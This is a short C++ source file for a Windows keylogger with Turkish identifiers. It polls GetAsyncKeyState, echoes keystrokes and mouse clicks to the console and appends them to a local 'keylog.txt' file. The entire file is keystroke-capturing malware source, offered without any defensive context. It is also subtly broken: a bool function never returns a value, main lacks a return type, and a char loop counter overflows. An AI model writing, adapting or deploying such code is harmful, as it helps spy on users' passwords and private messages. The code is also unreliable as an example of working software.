#include <Windows.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <string>
#include <unistd.h>
using namespace std;
void LogYaz(LPCSTR text){
	ofstream logdosya;
	logdosya.open("keylog.txt", fstream::app);
	logdosya << text;
	logdosya.close();
}
bool basilantus(int tus){
	switch(tus){
		case VK_SPACE:
			cout << " ";
			LogYaz(" ");
			break;
		case(VK_RETURN):
			cout << "\n";
			LogYaz("\n");
			break;
		case VK_SHIFT:
			cout << " *Shift* ";
			LogYaz(" *Shift* ");
			break;
		case VK_BACK:
			cout << "\b";
			LogYaz("\b");
			break;
		case VK_RBUTTON:
			cout << " *rclick* ";
			LogYaz(" *rclick* ");
			break;
		case VK_LBUTTON:
			cout << " *lclick";
			LogYaz(" *lclick* ");
			break;
		default: false;
		
	}
}
main(){
	char bastus;
	while(TRUE){
		sleep(10);
		for (bastus=8;bastus<=190;bastus++){
			if (GetAsyncKeyState(bastus) == -32767){
				if (basilantus(bastus) == FALSE){
					ofstream logdosya;
					logdosya.open("keylog.txt", fstream::app);
					logdosya << bastus;
					logdosya.close();
					
				}
			}
		}
	}
}
